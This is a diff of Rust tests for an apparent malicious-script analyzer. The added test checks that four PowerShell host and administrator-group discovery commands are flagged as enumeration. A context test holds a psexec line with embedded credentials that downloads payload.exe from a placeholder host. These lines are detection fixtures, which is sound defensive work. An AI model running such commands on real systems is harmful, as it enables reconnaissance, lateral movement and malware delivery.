@@ -4745,6 +4745,35 @@ powershell -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName 
     }
 
     #[test]
+    fn additional_powershell_discovery_cmdlets_emit_enumeration_traits() {
+        let report = analyze(
+            br#"powershell -Command "Get-ComputerInfo"
+powershell -Command "Get-HotFix"
+powershell -Command "Get-LocalGroupMember Administrators"
+powershell -Command "Get-NetIPConfiguration"
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for (kind, needle) in [
+            ("ps-computerinfo", "Get-ComputerInfo"),
+            ("ps-hotfix", "Get-HotFix"),
+            ("ps-localgroupmember", "Get-LocalGroupMember Administrators"),
+            ("ps-netipconfiguration", "Get-NetIPConfiguration"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command }
+                        if enum_kind == kind && command.contains(needle)
+                )),
+                "missing additional PowerShell discovery enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
